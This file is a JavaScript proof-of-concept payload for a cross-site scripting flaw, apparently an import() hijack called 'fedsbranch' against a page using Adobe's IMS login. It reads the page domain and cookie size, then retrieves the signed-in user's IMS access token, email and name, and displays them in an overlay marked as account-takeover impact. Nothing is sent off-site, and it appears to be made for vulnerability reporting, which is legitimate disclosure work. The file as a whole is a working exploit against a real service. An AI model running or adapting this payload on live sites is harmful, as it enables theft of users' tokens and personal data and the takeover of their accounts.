export async function main(config) {
  const d = document.domain;
  const banner = document.createElement('div');
  banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#c00;color:#fff;padding:20px;z-index:999999;font-size:18px;text-align:center;font-family:sans-serif';
  banner.textContent = 'XSS PoC - fedsbranch import() hijack on ' + d;
  document.body.prepend(banner);

  const info = document.createElement('pre');
  info.style.cssText = 'position:fixed;top:60px;left:20px;right:20px;background:#111;color:#0f0;padding:20px;z-index:999999;font-size:14px;font-family:monospace;max-height:60vh;overflow:auto;border-radius:8px';

  const lines = [];
  lines.push('[fedsbranch XSS] document.domain = ' + d);
  lines.push('[fedsbranch XSS] document.cookie length = ' + document.cookie.length + ' bytes');
  lines.push('[fedsbranch XSS] location = ' + location.href);

  try {
    if (window.adobeIMS && window.adobeIMS.getAccessToken) {
      const token = await window.adobeIMS.getAccessToken();
      if (token && token.token) {
        lines.push('[fedsbranch XSS] IMS access_token = ' + token.token.substring(0, 40) + '...');
        lines.push('[fedsbranch XSS] IMPACT: Full IMS token theft -> Account Takeover');
      }
    }
  } catch (e) {
    lines.push('[fedsbranch XSS] IMS not loaded yet');
  }

  try {
    if (window.adobeIMS && window.adobeIMS.getProfile) {
      const profile = await window.adobeIMS.getProfile();
      if (profile) {
        lines.push('[fedsbranch XSS] user email = ' + (profile.email || 'N/A'));
        lines.push('[fedsbranch XSS] user name = ' + (profile.displayName || profile.name || 'N/A'));
      }
    }
  } catch (e) {
    lines.push('[fedsbranch XSS] Profile not available');
  }

  info.textContent = lines.join('\n');
  document.body.prepend(info);
}
